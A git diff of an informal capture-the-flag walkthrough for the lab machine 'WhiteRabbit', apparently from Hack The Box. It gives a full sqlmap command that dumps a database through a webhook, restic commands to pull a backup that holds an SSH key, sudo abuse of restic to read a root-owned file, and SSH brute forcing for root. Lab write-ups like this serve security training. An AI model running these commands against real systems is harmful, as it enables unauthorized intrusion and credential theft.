@@ -1,4 +1,5 @@
 
+![WhiteRabbit](https://github.com/user-attachments/assets/72f68fcd-bb04-4d1a-a924-29240a5e82ca)
 
 we manage to find some subdomains 
 	status.whitrabbit.htb then just bruteforcing directories for interesting files 
@@ -13,12 +14,11 @@ we manage to find some subdomains
 
 		28efa8f7df.whiterabbit.htb
 
-
-	so the few we got , we take the last one for pentesting it 
+so the few we got , we take the last one for pentesting it 
 			we came onto a todo list website ; 
 		
-		then trying to see all to do , we see http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks
-		we saw this lines 
+then trying to see all to do , we see http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks
+we saw this lines 
 
 				Database Interactions
 
@@ -33,12 +33,14 @@ we manage to find some subdomains
 Understand the trully purpose of that , we're figure out that the target should be vulnerable to  sqli 
 		So using sqlmap , this is the full command , i ommitted the steps to retrieve database and table we interest on
 
-		# Sqli testing
+# Sqli testing
 
 		sqlmap -u http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d --method POST --data '{"campaign_id":2,"email":"test@mail.com","message":"Clicked Linka"}' -p email --proxy http://127.0.0.1:8080/ --batch --dump --level=5 --risk=3 -D temp -T command_log --flush
 
+![Screenshot_2025-04-11_06_00_45](https://github.com/user-attachments/assets/a2e354ff-c95b-40d9-bde5-c748c2e20dfe)
 
-		# Note  that  it could take a bit longer but hopefully we do it right , alternatively , i redirect the traffic to my burp instance crawler this is why you see --proxy tag 
+
+# Note  that  it could take a bit longer but hopefully we do it right , alternatively , i redirect the traffic to my burp instance crawler this is why you see --proxy tag 
 
 
 						+----+---------------------+--------------------------------------------------
@@ -66,19 +68,20 @@ Understand the trully purpose of that , we're figure out that the target should 
 				----------------------------+
 
 
-	Ok , let's thinking , that seems to be a restic manager repo , so the user inits a restic on the new subdomain 
+Ok , let's thinking , that seems to be a restic manager repo , so the user inits a restic on the new subdomain 
 
-	let's try to enum available repos in this . 
+let's try to enum available repos in this . 
 			restic --repo rest:http://75951e6ff.whiterabbit.htb snapshots
  					so paste the password once prompted
 
- 	what we do now is to restore the repo in our machine : restic --repo rest:http://75951e6ff.whiterabbit.htb restore [id] --target path_you_wanna_save
+ what we do now is to restore the repo in our machine : 
+ 			restic --repo rest:http://75951e6ff.whiterabbit.htb restore [id] --target path_you_wanna_save
 
- 	Once done , you'll find a 7-ZIP archive file in it  that's locked ; crack it and then use the private inside to log as bobn on the system 
+ Once done , you'll find a 7-ZIP archive file in it  that's locked ; crack it and then use the private inside to log as bobn on the system 
 
  			ssh -i id_rsa bob@whiterabbit.htb -p 2222
 
- 	Logging in as bob 
+ Logging in as bob 
 
  			bob@ebdce80611e9:~$ sudo -l
 					Matching Defaults entries for bob on ebdce80611e9:
@@ -107,4 +110,12 @@ Understand the trully purpose of that , we're figure out that the target should 
 			sudo restic -r u dump latest /root/morpheus
 
 	Now , copy the ouput and get connected as morpheus on 22 ssh port  and enjoy the user's flag
-		 
+![Screenshot_2025-04-11_10_35_48](https://github.com/user-attachments/assets/3a99d21d-d04d-40b3-ae3b-b78a1edf50e1)
+then  the root way is a bit tricky ; go check in /opt for neo-geo-generator then brute the ssh to log as neo and make sudo su to grab the last flag
+![Screenshot_2025-04-11_11_00_59](https://github.com/user-attachments/assets/8c034560-078c-46d2-a807-c4d130b6d4f3)
+
+ 
+ 
+![Screenshot_2025-04-11_11_01_45](https://github.com/user-attachments/assets/42661c86-21d2-4a71-bd2d-e2a2903342fb)
+
+
